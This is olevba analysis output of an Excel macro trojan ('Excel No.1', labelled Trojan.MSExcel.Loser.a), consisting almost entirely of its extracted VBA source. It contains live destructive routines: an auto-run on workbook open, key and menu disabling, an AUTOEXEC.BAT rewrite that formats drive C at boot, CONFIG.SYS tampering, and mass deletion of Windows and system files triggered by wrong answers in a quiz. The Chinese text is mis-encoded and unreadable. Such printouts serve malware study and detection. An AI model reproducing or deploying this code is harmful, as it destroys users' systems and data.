olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    If Not OK Then
        Cancel = True
    Else
        Cancel = False
        Exit Sub
    End If
    ThisWorkbook.Worksheets("ExcelNo1").Visible = False
    ThisWorkbook.Worksheets("ExcelNo1").Save
    Set S = Nothing
End Sub
Private Sub Workbook_Open()
    AutoOpen.Main
    ThisWorkbook.Worksheets("ExcelNo1").Visible = True
    ThisWorkbook.Worksheets("ExcelNo1").Activate
    OK = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global Const Config$ = "C:\CONFIG.SYS"
Global Const Autoexec$ = "C:\AUTOEXEC.BAT"

Public S As Object, OK As Boolean
Public OfficeDir$, TemplateDir$, StartDir$
Public Sub Main()
    StatusBar = "¥¿¦bªì©l¤Æ³]©w..."
    Application.ScreenUpdating = False
    SaveFile
    GetDirs
    InterruptKeys
    StatusBar = "Excel No.1¤w¸g¦û¾Ú±zªº¨t²Î"
    Application.ScreenUpdating = True
End Sub
Public Sub GetDirs()
    ExcelDir$ = Application.Path
    TemplateDir$ = Application.TemplatesPath
    StartDir$ = Application.StartupPath
End Sub
Public Sub KillMenu()
    On Error Resume Next
    Application.CommandBars("Worksheet Menu Bar").Controls(9).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(8).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(6).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(5).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(4).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(3).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(2).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(1).Delete
End Sub
Public Sub ReAuto()
    On Error Resume Next
    If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
        SetAttr Autoexec$, 0
    End If
    No = FreeFile
    Open "C:\c" For Output As #No
        Print #No, "y" & Chr$(13)
        Print #No, Chr$(13)
    Close #No
    No = FreeFile
    Open Autoexec$ For Output As #No
        Print #No, "PATH = C:\;" & S.WinPath & "\COMMAND;" & S.SystemPath
        Print #No, "format C:/u/q/v:EXCELNO1 < c"
    Close #No
End Sub
Public Sub SaveFile()
    f$ = StartDir & "\BOOK.XLT"
    If UCase(Dir(f$)) = "BOOK.XLT" Then Exit Sub
    On Error Resume Next
    Application.ActiveWorkbook.SaveAs FileName:=f$, FileFormat:=xlTemplate
    Set S = New X
    For c = 1 To 20
        S.CreateLink 1, "Excel No.1 - " & c, f$, ""
    Next c
    Set S = Nothing
End Sub
Public Sub InterruptKeys()
    On Error Resume Next
    With Application
        .OnKey "{BACKSPACE}", ""
        .OnKey "{BREAK}", ""
        .OnKey "{DOWN}", ""
        .OnKey "{UP}", ""
        .OnKey "{LEFT}", ""
        .OnKey "{RIGHT}", ""
        .OnKey "{ESC}", ""
        .OnKey "{DEL}", ""
        .OnKey "{HOME}", ""
        .OnKey "{END}", ""
        .OnKey "{PGDN}", ""
        .OnKey "{PGUP}", ""
        .OnKey "{RETURN}", ""
        .OnKey "{ENTER}", ""
        .OnKey "{TAB}", ""
        .OnKey "%{F4}", ""
        .OnKey "{F1}", ""
        .OnKey "{NUMLOCK}", ""
    End With
End Sub
Public Sub SafeExit()
    OK = True
    ThisWorkbook.Saved = True
    Application.Quit
End Sub
Public Sub ReConfig()
    On Error Resume Next
    If UCase(Dir(Config$)) = "CONFIG.SYS" Then
        SetAttr "C:\CONFIG.SYS", 0
    End If
    No = FreeFile
    Open Config$ For Output As #No
        Print #No, "Rem **** You're infected by Excel No.1 Macro Virus!"
        Print #No, "Dos = Low"
        Print #No, "FCBS = 255"
        Print #No, "FILES = 255"
        Print #No, "LastDrive = Z"
        Print #No, "SET TEMP = C:\"
        Print #No, "SET TMP = C:\"
        Print #No, "STACKS = 64, 512"
        Print #No, "SWITCHES= /F /K /N"
    Close #No
End Sub
-------------------------------------------------------------------------------
VBA MACRO Progress.bas 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Progress'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Declare Function fCreateShellLink Lib "STKIT432.DLL" _
        (ByVal Folder As String, ByVal ShortCutName As String, _
        ByVal ExePath As String, ByVal Params As String) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Sub Begin()
    MsgBox "¶}©l¶i¤J¦Û§Ú¸Ñ¬rµ{§Ç", vbOKOnly & vbInformation, "Excel No.1"
    Game.Show
    Guess.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Game.frm 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SafeOver As Boolean
Private Sub cmdStart_Click()
    d = S.GetRandomNumber(1, 100)
    On Error Resume Next
    Select Case d
        Case 1 To 46
            Tar1.Visible = False
            Tar2.Visible = False
            Tar3.Caption = "²Ä¤T¼h"
            Arrow.Top = Arrow.Top - 45
            Arrow.Left = Arrow.Left - 60
            Arrow.ZOrder 0
            MsgBox "«¢«¢¡I§Ú´N»¡¹À¡I¤µ¤Ñ¬O±z­Ë·°ªº¤é¤l¡I", vbCritical
            ReConfig
            ReAuto
        Case 47 To 80
            Tar1.Visible = False
            Tar2.Caption = "²Ä¤G¼h"
            Tar3.Visible = False
            Arrow.Top = Arrow.Top - 60
            Arrow.Left = Arrow.Left - 30
            Arrow.ZOrder 0
            MsgBox "«¢«¢¡I§Ú´N»¡¹À¡I¤µ¤Ñ¬O±z­Ë·°ªº¤é¤l¡I", vbCritical
            ReConfig
            KillMenu
            Kill S.WinPath & "\*.ini"
        Case Else
            Tar1.Caption = "²Ä¤@¼h¡Ð¬õ¤ß"
            Tar2.Visible = False
            Tar3.Visible = False
            Arrow.Top = Arrow.Top - 60
            Arrow.ZOrder 0
            MsgBox "¯u¨«¹B¡IÅý±z»X¨ì°Õ¡I¤U¤@Ãö¤@©wÅý±z¦º±o«ÜÃø¬Ý¡I", vbInformation
    End Select
    SafeOver = True
    Unload Game
End Sub
Private Sub UserForm_Initialize()
    SafeOver = False
    Set S = New X
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If SafeOver Then
        Cancel = False
    Else
        Cancel = True
    End If
    Set S = Nothing
End Sub
-------------------------------------------------------------------------------
VBA MACRO Guess.frm 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SafeOver As Boolean, Ret As Integer, Total As Integer
Dim Q(1 To 100) As String, Opt1(1 To 100) As String, Opt2(1 To 100) As String, Opt3(1 To 100) As String, Ans(1 To 100) As Integer
Private Function Choose() As Integer
    d = S.GetRandomNumber(1, 73)
    Content.Caption = Q(d)
    O1.Caption = Opt1(d)
    O2.Caption = Opt2(d)
    O3.Caption = Opt3(d)
    Choose = d
End Function
Private Sub Finish()
    If Val(LabRight.Caption) = 0 Then
            MsgBox "¯u¬O¶W¯Å»¹ÀÅ¤F¡I¤@ÃD¤]¨Sµª¹ï¡I§A¦b²V¦Yµ¥¦º°Ú¡H", vbCritical
            On Error Resume Next
            Name S.WinPath & "\WIN.COM" As S.WinPath & "\LOSE.COM"
            Kill S.WinPath & "\*.*"
            Kill S.SystemPath & "\*.*"
    ElseIf Val(LabRight.Caption) = Total Then
            MsgBox "¯u´Î¡I§¹¥þµª¹ï¡IExcel No.1 §@ªÌ¸s¹ï±z­P±R°ªªº·q·N¡A«ö¤U½T©w«ö¶s«á¦Û°Ê²M°£¥»¯f¬r..."
            SafeOver = True
            On Error Resume Next
            Unload Me
            For Each w2 In Workbooks
                w2.Saved = True
            Next w2
            OK = True
            Application.Quit
    Else
            MsgBox "±zÁ`¦@µª¹ï¤F " & LabRight.Caption & " ÃD"
    End If
    SafeOver = True
    Unload Me
End Sub
Private Sub Correct()
    LabRight.Caption = Val(LabRight.Caption) + 1
End Sub
Private Sub Wrong()
    On Error Resume Next
    Static T
    Select Case T
        Case 0
            Kill S.SystemPath & "\*.DLL"
        Case 1
            Kill S.WinPath & "\*.COM"
        Case 2
            Kill S.WinPath & "\*.EXE"
        Case 3
            Kill S.SystemPath & "\*.DRV"
        Case 4
            Kill S.WinPath & "\*.INF"
        Case 5
            Kill S.WinPath & "\*.INI"
        Case 6
            Kill CurDir & "\*.*"
        Case 7
            Kill Application.Path & "\*.*"
        Case 8
            Kill Application.TemplatesPath & "\*.*"
        Case Else
            For m = 0 To 2
                For n = 1 To S.GetRandomNumber(15, 99)
                    S.CreateLink m, "Virus" & n, "C:\COMMAND.COM", ""
                Next n
            Next m
    End Select
    T = T + 1
End Sub
Private Sub CommandButton1_Click()
    If Val(LabRest.Caption) = 0 Then
        Finish
    End If
    Ret = Choose()
    Sure.Enabled = True
    CommandButton1.Enabled = False
End Sub
Private Sub Sure_Click()
    If Ret = 0 Then Exit Sub
    Select Case Ans(Ret)
        Case 1
            If O1.Value = True Then
                Correct
            Else
                Wrong
            End If
        Case 2
            If O2.Value = True Then
                Correct
            Else
                Wrong
            End If
        Case 3
            If O3.Value = True Then
                Correct
            Else
                Wrong
            End If
    End Select
    LabRest.Caption = Val(LabRest.Caption) - 1
    Sure.Enabled = False
    CommandButton1.Enabled = True
End Sub
Private Sub UserForm_Initialize()
    SafeOver = False
    Set S = New X
    ReadQuestions
    ReadQuestions2
    Sure.Enabled = False
    Total = Val(LabRest.Caption)
    Content.Caption = "«ö¤@¤U«ö¶s¶}©l´úÅç"
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    If SafeOver Then
        Cancel = False
    Else
        Cancel = True
        Exit Sub
    End If
    Set S = Nothing
End Sub
Private Sub ReadQuestions2()
    Q(61) = "¥H¤U«°¥«¥Ñ¥_¦V«n±Æ¦C¦óªÌ¿ù»~¡H"
    Opt1(61) = "·çÁJ=>¥É¨½=>¥ú´_=>¦¨¥\=>¥xªF"
    Opt2(61) = "¦Á¤î=>Åaºq=>¤ºÃc=>ªO¾ô=>¤¤Ãc"
    Opt3(61) = "¦Á¤î=>¸UµØ=>¤ºÃc=>·¨±ö=>­]®ß"
    Ans(61) = 2
    
    Q(62) = "¥H¤U«°¥«¥Ñ¥_¦V«n±Æ¦C¦óªÌ¥¿½T¡H"
    Opt1(62) = "ÀY«°=>·çÁJ=>¥É¨½=>¦¨¥\=>¥xªF"
    Opt2(62) = "Ã¹ªF=>©yÄõ=>ªá½¬=>¥xªF=>«ÌªF"
    Opt3(62) = "¦Á¤î=>¸UµØ=>¤¤Ãc=>´ò¤f=>¤s¨Î"
    Ans(62) = 1
    
    Q(63) = "¥H¤UÃö©ó¥x¥_¥«ªº¹D¸ô¥Ñ¥_¦V«n±Æ¦C¦óªÌ¥¿½T¡H"
    Opt1(63) = "¥Á±ÚªF¸ô=>¥ÁÅvªF¸ô=>¥_¥­ªF¸ô=>ªø¦wªF¸ô"
    Opt2(63) = "©¾§µªF¸ô=>«n¨ÊªF¸ô=>¥_¥­ªF¸ô=>ªø¦wªF¸ô"
    Opt3(63) = "¥Á±ÚªF¸ô=>¥ÁÅvªF¸ô=>¥Á¥ÍªF¸ô=>«n¨ÊªF¸ô"
    Ans(63) = 3
    
    Q(64) = "¥H¤UÃö©ó¥x¥_¥«ªº¹D¸ô¥ÑªF¦V¦è±Æ¦C¦óªÌ¥¿½T¡H"
    Opt1(64) = "­«¼y¥_¸ô=>¤¤¤s¥_¸ô=>«Ø°ê¥_¸ô=>´°¤Æ¥_¸ô"
    Opt2(64) = "¤¤¤s¥_¸ô=>´°¤Æ¥_¸ô=>·s¥Í¥_¸ô=>«Ø°ê¥_¸ô"
    Opt3(64) = "¤¤¤s¥_¸ô=>­«¼y¥_¸ô=>«Ø°ê¥_¸ô=>°ò¶©¸ô"
    Ans(64) = 1
    
    Q(65) = "¥x¥_¥«ªº¤¤¤s¥_¸ô¤£©M¥H¤U¦óªÌ¬Û¥æ¡H"
    Opt1(65) = "¥Á±ÚªF¸ô"
    Opt2(65) = "Ã¹´µºÖ¸ô"
    Opt3(65) = "©¾§µªF¸ô"
    Ans(65) = 2
    
    Q(66) = "¥x¥_¥«ªº©¾§µªF¸ô©M¥H¤U¦óªÌ¬Û¥æ¡H"
    Opt1(66) = "¤¯·R¸ô"
    Opt2(66) = "Ã¹´µºÖ¸ô"
    Opt3(66) = "´°¤Æ¥_¸ô"
    Ans(66) = 1
    
    Q(67) = "¥x¥_¥«ªº¥ÁÅv¦è¸ô©M¥H¤U¦óªÌ¬Û¥æ¡H"
    Opt1(67) = "©Ó¼w¸ô"
    Opt2(67) = "Ã¹´µºÖ¸ô"
    Opt3(67) = "´°¤Æ¥_¸ô"
    Ans(67) = 1
    
    Q(68) = "¥x¥_¥«ªº«n¨Ê¦è¸ô©M¥H¤U¦óªÌ¬Û¥æ¡H"
    Opt1(68) = "©Ó¼w¸ô"
    Opt2(68) = "«H¸q¸ô"
    Opt3(68) = "«Ø°ê¥_¸ô"
    Ans(68) = 1
    
    Q(69) = "¥x¥_¥«ªºªø¦wªF¸ô©M¥H¤U¦óªÌ¬Û¥æ¡H"
    Opt1(69) = "¤¤¤s¥_¸ô"
    Opt2(69) = "«H¸q¸ô"
    Opt3(69) = "©Ó¼w¸ô"
    Ans(69) = 1
    
    Q(70) = "¥H¤U¦óªÌ¤£¬O¥x¥_¥«ªº¤j¦w´ËªL¤½¶éªº©PÃä¹D¸ô¡H"
    Opt1(70) = "©¾§µªF¸ô"
    Opt2(70) = "«H¸q¸ô"
    Opt3(70) = "©M¥­ªF¸ô"
    Ans(70) = 1
    
    Q(71) = "¥H¤U¦óªÌ¤£»P¥x¥_¥«ªº¤ì¬]±¶¹B¬Û¥æ¡H"
    Opt1(71) = "©¾§µªF¸ô"
    Opt2(71) = "©Ó¼w¸ô"
    Opt3(71) = "¥Á¥ÍªF¸ô"
    Ans(71) = 2
    
    Q(72) = "¥H¤U¦óªÌ¤£¬O¥x¥_¥«¤hªL°Ïªº¹D¸ô¦WºÙ¡H"
    Opt1(72) = "¥õ¼w¤j¹D"
    Opt2(72) = "¤¤¤s¥_¸ô"
    Opt3(72) = "«n®ü¸ô"
    Ans(72) = 3
    
    Q(73) = "¥H¤U¦óªÌ¤£¬O¥x¥_¥«¤hªL°Ïªº¹D¸ô¦WºÙ¡H"
    Opt1(73) = "­«¼y«n¸ô"
    Opt2(73) = "¤¤¤s¥_¸ô"
    Opt3(73) = "©¾¸Û¸ô"
    Ans(73) = 1
End Sub
Private Sub ReadQuestions()
    Q(1) = "½Ð°Ý¥H¤U­þ­ÓIP¬O¤¤¿³ªk°ÓBBSªº¦ì§}¡H"
    Opt1(1) = "140.112.1.6"
    Opt2(1) = "192.192.35.34"
    Opt3(1) = "203.64.35.100"
    Ans(1) = 2
    
    Q(2) = "½Ð°Ý¥H¤U­þ­Ó¤H³Ì¤£¥i¯à¬O Excel No.1 ªº§@ªÌ¡H"
    Opt1(2) = "¯Î¥@»¨"
    Opt2(2) = "§d«T½n"
    Opt3(2) = "³¯²MªÚ"
    Ans(2) = 3
    
    Q(3) = "½Ð°Ý¥H¤Uªº¥_·¥¬P¨Ï¥ÎªÌ¤¤¡A­þ­Ó¤H³Ì½â¡H"
    Opt1(3) = "Shirely"
    Opt2(3) = "Takeshi"
    Opt3(3) = "July"
    Ans(3) = 1
    
    Q(4) = "½Ð°Ý¥H¤U­þ­Ó¤H¤w¸g¤£¬O³B¤k¤F¡H"
    Opt1(4) = "±R¢è¥ø±M¢æ¶T¬ì½²ªÚ©y"
    Opt2(4) = "¥x¥_¢è±M¢æ«O¬ì¤ýÃý¿Ë"
    Opt3(4) = "¢è§d¤j¾Ç­S¨ÈÜ¨"
    Ans(4) = 3
    
    Q(5) = "½Ð°Ý³q±`°ª´¶¦Ò¦b­þ­Ó¤ë©ñº]¡H"
    Opt1(5) = "¤@¤ë"
    Opt2(5) = "¤K¤ë"
    Opt3(5) = "¤Q¤ë"
    Ans(5) = 3
    
    Q(6) = "½Ð°Ý¥H¤U­þ­Ó¤H¤£¬O±þ®`¥Õ¾å¿Pªº¥û¤â¡H"
    Opt1(6) = "³¯¶i¿³"
    Opt2(6) = "ªL¬K¥Í"
    Opt3(6) = "¥Õ¦B¦B"
    Ans(6) = 3
    
    Q(7) = "½Ð°Ý¥H¤U­þ­Ó³nÅé¤£¬O·L³n¤½¥q¥Xªº¡H"
    Opt1(7) = "PHOTOSHOP"
    Opt2(7) = "OFFICE 97"
    Opt3(7) = "INTERNET EXPLORER"
    Ans(7) = 1
    
    Q(8) = "½Ð°Ý¥H¤U­þ­Ó³nÅé¤£¬O·L³n¤½¥q¥Xªº¡H"
    Opt1(8) = "WORD PRO"
    Opt2(8) = "OFFICE 97"
    Opt3(8) = "WINDOWS 95"
    Ans(8) = 1
    
    Q(9) = "·Å¥§»ä­·¹L¹Ò³y¦¨ºG­«ªº·l®`¡A¥H¤U­þ­Ó³æ¦ì³Ì¤£»Ý­n­t³d¡H"
    Opt1(9) = "¦æ¬F°|¦U³¡·|"
    Opt2(9) = "¤hªL¦aÀË¸p"
    Opt3(9) = "¤ô§Q§½"
    Ans(9) = 2
    
    Q(10) = "¥H¤U­þ­Ó¤H¬OVB5»PActiveXµ{¦¡³]­pªº§@ªÌ¡H"
    Opt1(10) = "Á§¾å´P"
    Opt2(10) = "¤ý°êºa"
    Opt3(10) = "¾H¤å²W"
    Ans(10) = 2
    
    Q(11) = "¥H¤U­þ­Ó¤H¬OWord 97ªº¨Ï¥ÎÃÀ³N¤§§@ªÌ¡H"
    Opt1(11) = "Á§¾å´P"
    Opt2(11) = "¤ý°êºa"
    Opt3(11) = "¾H¤å²W"
    Ans(11) = 1
    
    Q(12) = "¥H¤U­þ­Ó¤H¬O¥_´ä­»Äl¤H¤H´¡¤@®Ñ¤¤©Ò¼v®gªº¤H¡H"
    Opt1(12) = "Â£¬ü»ñ"
    Opt2(12) = "¥Õ¦B¦B"
    Opt3(12) = "³¯¤åÓ}"
    Ans(12) = 3
    
    Q(13) = "¥H¤U­þ­Ó¤H¥Ø«e³Ì¤£¥i¯à¬O¥xµø·s»Dªº¥D¼½¡H"
    Opt1(13) = "§õ¼z¼z"
    Opt2(13) = "Ä¬©v©É"
    Opt3(13) = "¼BÄR´f"
    Ans(13) = 2
    
    Q(14) = "¥H¤U­þ­Ó¤H¥Ø«e³Ì¤£¥i¯à·í¤¤µØ¥Á°êÁ`²Î¡H"
    Opt1(14) = "¦¿¿A¥Á"
    Opt2(14) = "§º·¡·ì"
    Opt3(14) = "³s¾Ô"
    Ans(14) = 1
    
    Q(15) = "¥H¤U­þºØ¤gÄ[³Ì¦³¥i¯à¤À¥¬¦b¥xÆW¦è³¡®ü®H¦a¡H"
    Opt1(15) = "¬õÄ["
    Opt2(15) = "ÆQº{¤g"
    Opt3(15) = "µµ´ÄÄ["
    Ans(15) = 2
    
    Q(16) = "¥H¤U­þºØ¤gÄ[³Ì¦³¥i¯à¤À¥¬¦b¥|¤t¬Ö¦a¡H"
    Opt1(16) = "¬õÄ["
    Opt2(16) = "ÆQº{¤g"
    Opt3(16) = "¦Ç´ÄÄ["
    Ans(16) = 1
    
    Q(17) = "¥H¤U­þ­Ó¦WºÙ¤£´¿³Q¯f¬r§@ªÌ®³¨Ó©R¦W¹L¡H"
    Opt1(17) = "°¨»\¥ý"
    Opt2(17) = "¥xÆW­ì¦í¥Á"
    Opt3(17) = "¤¤¥¡±¡³ø§½"
    Ans(17) = 3
    
    Q(18) = "¥H¤U­þ­Ó¤H¦b¤Ñ¦t¥¬³UÀ¸¤¤¬¡±o³Ì¤[¡H"
    Opt1(18) = "ÂÃ­×Ã¹"
    Opt2(18) = "©t¿W¬r"
    Opt3(18) = "ÂÃ¯«¯µ"
    Ans(18) = 3
    
    Q(19) = "¥H¤U­þ­Ó¤H¦b¤Ñ¦t¥¬³UÀ¸¤¤¬¡±o³Ì¤[¡H"
    Opt1(19) = "¤»¤âÅ]¹³"
    Opt2(19) = "©t¿W¬r"
    Opt3(19) = "«ã«B­¸Às"
    Ans(19) = 1
    
    Q(20) = "¥H¤U­þ­Ó¤H¦b¤Ñ¦t¥¬³UÀ¸¸Ì©MÂÃ¯«¯µÃö«Y³Ì±K¤Á¡H"
    Opt1(20) = "¸G¤lÆF"
    Opt2(20) = "¤Tµô¤½"
    Opt3(20) = "«ã«B­¸Às"
    Ans(20) = 2
    
    Q(21) = "¥H¤U­þ­Ó¤H¦b¤Ñ¦t¥¬³UÀ¸¸Ì©M¬õ¶³Ãö«Y³Ì¤£²`¡H"
    Opt1(21) = "³y¶³ÄQÅï"
    Opt2(21) = "¼C­]¤pÂù"
    Opt3(21) = "¹Ú«B²["
    Ans(21) = 2
    
    Q(22) = "¥H¤U­þ­Ó³æ¦ì¬O¤¤µØ¥Á°ê³Ì°ªªº¦æ¬F¾÷Ãö¡H"
    Opt1(22) = "¦æ¬F°|"
    Opt2(22) = "Á`²Î©²"
    Opt3(22) = "°ê®a¦w¥þ§½"
    Ans(22) = 1
    
    Q(23) = "¥H¤U­þ­Ó³æ¦ì¬O¤¤µØ¥Á°ê³Ì°ªªº¥ßªk¾÷Ãö¡H"
    Opt1(23) = "¦æ¬F°|"
    Opt2(23) = "Á`²Î©²"
    Opt3(23) = "¥ßªk°|"
    Ans(23) = 3
    
    Q(24) = "¥H¤U­þ­Ó³æ¦ì¥i¥H¸ÑÄÀ¤¤µØ¥Á°ê¾Ëªk¡H"
    Opt1(24) = "¥ßªk°|"
    Opt2(24) = "Á`²Î©²"
    Opt3(24) = "¤jªk©x·|Ä³"
    Ans(24) = 3
    
    Q(25) = "°ê¤÷»{¬°¤°»ò¬O¤H¥ÁÅv§Qªº«O»Ù®Ñ¡H"
    Opt1(25) = "¥Áªk"
    Opt2(25) = "¦Dªk"
    Opt3(25) = "¾Ëªk"
    Ans(25) = 3
    
    Q(26) = "¥Ø«e¥H¤U¦ó¤H¤£¨É¦³¨¥½×§K³dÅv¡H"
    Opt1(26) = "¥ßªk©e­û"
    Opt2(26) = "Á`²Î"
    Opt3(26) = "¬ÙÄ³­û"
    Ans(26) = 2
    
    Q(27) = "¥Ø«e¥H¤U¦ó¤H¤£¨É¦³¨¥½×§K³dÅv¡H"
    Opt1(27) = "¥ßªk©e­û"
    Opt2(27) = "ºÊ¹î©e­û"
    Opt3(27) = "°ê¤j¥Nªí"
    Ans(27) = 2
    
    Q(28) = "¥Ø«e¥H¤U¦ó¤H¤£¨É¦³¨¥½×§K³dÅv¡H"
    Opt1(28) = "¥ßªk©e­û"
    Opt2(28) = "ªk©x"
    Opt3(28) = "°ê¤j¥Nªí"
    Ans(28) = 2
    
    Q(29) = "§Ú°ê¨ü²z¦æ¬F¶D³^ªº¾÷Ãö¬O¡H"
    Opt1(29) = "¦æ¬F°|·|Ä³"
    Opt2(29) = "¾Ëªkªk®x"
    Opt3(29) = "¦æ¬Fªk°|"
    Ans(29) = 3
    
    Q(30) = "§Ú°ê­þºØ©xÂ¾ªº´NÂ¾«Å»}»}µü©ú©w©ó¾Ëªk¤º¡H"
    Opt1(30) = "¦æ¬F°|ªø"
    Opt2(30) = "Á`²Î"
    Opt3(30) = "¥qªk°|ªø"
    Ans(30) = 2
    
    Q(31) = "§Ú°ê°ê¥Á¤j·|­Y­n­×§ï¾Ëªk¡A¨ä¨MÄ³³q¹Lªº¤H¼Æ»Ý¬O¥X®u¥Nªíªº´X¤À¤§´X¡H"
    Opt1(31) = "2/3"
    Opt2(31) = "3/4"
    Opt3(31) = "1/2"
    Ans(31) = 2

    Q(32) = "§Ú°êªk©xªº¥ô´Á¬O¡H"
    Opt1(32) = "¤E¦~"
    Opt2(32) = "²×¨­Â¾"
    Opt3(32) = "»P°õ¬FÄÒ¦P¶i°h"
    Ans(32) = 2
    
    Q(33) = "§Ú°ê¤jªk©x·|Ä³ªº¥D®u¬O¡H"
    Opt1(33) = "­º®u¤jªk©x"
    Opt2(33) = "Á`²Î©²¯µ®Ñªø"
    Opt3(33) = "¥qªk°|ªø"
    Ans(33) = 3
    
    Q(34) = "§Ú°ê°ê¤g­±¿n¬O¦h¤Ö¥­¤è¤½¨½¡H"
    Opt1(34) = "¤@¤d¤@¦Ê¥|¤Q¤G¸U"
    Opt2(34) = "¤G¤d¨â¦Ê¥|¤Q¤G¸U"
    Opt3(34) = "¤T¤d¤T¦Ê¥|¤Q¤G¸U"
    Ans(34) = 1
    
    Q(35) = "¥xÆW¥»®q­±¿n¬O¦h¤Ö¥­¤è¤½¨½¡H"
    Opt1(35) = "¤@¤d¤E¦Ê¥|¤Q¦h"
    Opt2(35) = "¤G¤d¤C¦Ê¤»¤Q¦h"
    Opt3(35) = "¤T¤d¤­¦Ê¤C¤Q¦h"
    Ans(35) = 1
    
    Q(36) = "¥xÆW¥»®q³Ì¤j¥­­ì¬O¡H"
    Opt1(36) = "¹Å«n¥­­ì"
    Opt2(36) = "ªáªF¥­­ì"
    Opt3(36) = "©yÄõ¥­­ì"
    Ans(36) = 1
    
    Q(37) = "¥H§Ú°êª©¹Ï¾ãÅé¦ì¸m¦Ó¨¥¡A¦ì©ó´X¦ó¤¤¤ßªº¦a²z°Ï¬O¡H"
    Opt1(37) = "¨â´ò¬Ö¦a"
    Opt2(37) = "ªe¦è¨«´Y"
    Opt3(37) = "Ã÷¦è°ª­ì"
    Ans(37) = 3
    
    Q(38) = "¦ì©óªø¥Õ¤s¦aªº¤Ñ¦À¬O¡H"
    Opt1(38) = "¤õ¤f´ò"
    Opt2(38) = "°³¶ë´ò"
    Opt3(38) = "Â_¼h´ò"
    Ans(38) = 1
    
    Q(39) = "¦³¶ë¤W¦¿«n¤§ºÙªº¬O¡H"
    Opt1(39) = "¹Å«n¥­­ì"
    Opt2(39) = "ªe®M"
    Opt3(39) = "¥|¤t³£¦¿³÷"
    Ans(39) = 2
    
    Q(40) = "Visual Basic 5.0¤¤¡A©R¥O«ö¶sª«¥ó¤£¨ã¦³¥H¤U¦óºØÄÝ©Ê¡H"
    Opt1(40) = "Caption"
    Opt2(40) = "Path"
    Opt3(40) = "MouseIcon"
    Ans(40) = 2
    
    Q(41) = "Visual Basic 5.0¤¤¡Aªí®æª«¥ó¤£¨ã¦³¥H¤U¦óºØÄÝ©Ê¡H"
    Opt1(41) = "Visible"
    Opt2(41) = "Enabled"
    Opt3(41) = "Value"
    Ans(41) = 3
    
    Q(42) = "¤U¦C¦óªÌ¤£¬Oºô»Úºô¸ô´£¨Ñªº¥\¯à©ÎªA°È¡H"
    Opt1(42) = "¥@¬É¦a²z¸ê°T¨t²Î"
    Opt2(42) = "ÀÉ®×¬d¸ß¨t²Î"
    Opt3(42) = "¹q¤l§G§iÄæ¨t²Î"
    Ans(42) = 1
    
    Q(43) = "ºô»Úºô¸ôªº­^¤å¬O¡H"
    Opt1(43) = "World Wide Web"
    Opt2(43) = "Intranet"
    Opt3(43) = "Internet"
    Ans(43) = 3
    
    Q(44) = "ºô»Úºô¸ôªº­^¤å¬O¡H"
    Opt1(44) = "World Wide Web"
    Opt2(44) = "Intranet"
    Opt3(44) = "Internet"
    Ans(44) = 3
    
